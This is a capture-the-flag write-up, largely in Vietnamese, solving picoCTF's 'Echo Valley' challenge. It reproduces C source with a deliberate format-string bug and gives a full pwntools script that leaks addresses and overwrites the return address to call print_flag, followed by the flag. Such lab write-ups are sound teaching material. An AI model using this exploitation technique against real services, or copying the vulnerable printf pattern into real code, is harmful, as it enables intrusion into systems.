# Echo Valley

## Information

- Category: RE
- Level: Medium

## Description

The echo valley is a simple function that echoes back whatever you say to it.
But how do you make it respond with something more interesting, like a flag?

## Hint

- Ever heard of a format string attack?

## Solution

### What we got ?

- Trước hết, đề bài cho một file binary và 1 source code của server cần kết nối tới.
- Kiểm tra code, ta nhận thấy `main()` chỉ thực hiện để gọi `echo_valley()`, và hàm này không hề có lệnh gọi hàm `print_flag()`, mặc dù source code có hàm `print_flag():`
    
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    
    void print_flag() {
        char buf[32];
        FILE *file = fopen("/home/valley/flag.txt", "r");
    
        if (file == NULL) {
          perror("Failed to open flag file");
          exit(EXIT_FAILURE);
        }
        
        fgets(buf, sizeof(buf), file);
        printf("Congrats! Here is your flag: %s", buf);
        fclose(file);
        exit(EXIT_SUCCESS);
    }
    
    void echo_valley() {
        printf("Welcome to the Echo Valley, Try Shouting: \n");
    
        char buf[100];
    
        while(1)
        {
            fflush(stdout);
            if (fgets(buf, sizeof(buf), stdin) == NULL) {
              printf("\nEOF detected. Exiting...\n");
              exit(0);
            }
    
            if (strcmp(buf, "exit\n") == 0) {
                printf("The Valley Disappears\n");
                break;
            }
    
            printf("You heard in the distance: ");
            printf(buf);
            fflush(stdout);
        }
        fflush(stdout);
    }
    
    int main()
    {
        echo_valley();
        return 0;
    }
    ```
    
- Nhận xét:
    - Chúng ta có thể sử dụng lỗ hổng chuỗi định dạng để ghi đè lên một số ô nhớ nhằm gọi hàm `print_flag`. Binary được biên dịch với tùy chọn **FULL RELRO**, vì vậy chúng ta không thể ghi đè lên bảng **GOT** (Global Offset Table). Chúng ta có thể sử dụng một kỹ thuật khác để gọi hàm `print_flag`. Chúng ta có thể ghi đè lên địa chỉ trả về (return address) của hàm `echo_valley` để gọi hàm `print_flag`.
    - Binary được biên dịch với tùy chọn **PIE** (Position-Independent Executable), vì vậy địa chỉ cơ sở (base address) của binary bị ngẫu nhiên hóa. Chúng ta có thể rò rỉ địa chỉ cơ sở của binary bằng cách sử dụng lỗ hổng chuỗi định dạng. Chúng ta cũng có thể rò rỉ địa chỉ stack bằng cách sử dụng lỗ hổng chuỗi định dạng.
    - Chúng ta có thể tính toán địa chỉ trả về của hàm `echo_valley` bằng cách cộng **8** vào địa chỉ stack đã rò rỉ. Chúng ta có thể tính toán offset (độ lệch) của lỗ hổng chuỗi định dạng bằng cách sử dụng lớp `FmtStr` từ thư viện `pwntools`. Sau đó, chúng ta có thể sử dụng hàm `fmtstr_payload` từ thư viện `pwntools` để tạo ra một payload nhằm ghi đè địa chỉ trả về của hàm `echo_valley` để gọi hàm `print_flag`.

### How to get flag ?

- Từ các nhận xét trên, có source code để lấy flag như sau:
    
    ```python
    from pwn import *
    
    binary = './valley'
    
    context.log_level = 'debug'
    context.binary = binary
    
    e = ELF(binary)
    r = remote('shape-facility.picoctf.net', 62015)
    
    def exec_fmt(payload):
        p = process(binary)
        p.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')
        p.sendline(payload)
        p.recvuntil(b'You heard in the distance: ')
        recv = p.recv()
        p.close()
        return recv
    
    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    
    r.recvuntil(b'Welcome to the Echo Valley, Try Shouting:')
    
    r.sendline(b'%21$p.%20$p')
    r.recvuntil(b'You heard in the distance: ')
    leak = r.recvline().strip().split(b'.')
    main_address_ = int(leak[0], 16)
    stack_address = int(leak[1], 16)
    log.info(f'main_address_: {hex(main_address_)}')
    
    base_address = main_address_ - (0x555555555413 - 0x555555554000)
    log.info(f'base_address: {hex(base_address)}')
    
    ret_address = stack_address + 8
    
    payload = fmtstr_payload(offset, { ret_address: base_address + e.sym['print_flag'] }, write_size='short')
    r.sendline(payload)
    r.sendline(b'exit')
    
    r.interactive()
    ```
    
- Ta dễ dàng tìm được flag như sau:
  
    ![Flag](https://www.notion.so/image/attachment%3Ad273fbd0-35e1-4089-b05f-95a48847546d%3Aimage.png?table=block&id=2c71b638-5371-8007-b7a3-d7a42a0493f6&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1340&userId=&cache=v2)
- Flag là **`picoctf{f1ckl3_f0rmat_f1asc0}`**  
    ![image.png](attachment:d273fbd0-35e1-4089-b05f-95a48847546d:image.png)
    
- Flag là **`picoctf{f1ckl3_f0rmat_f1asc0}`**
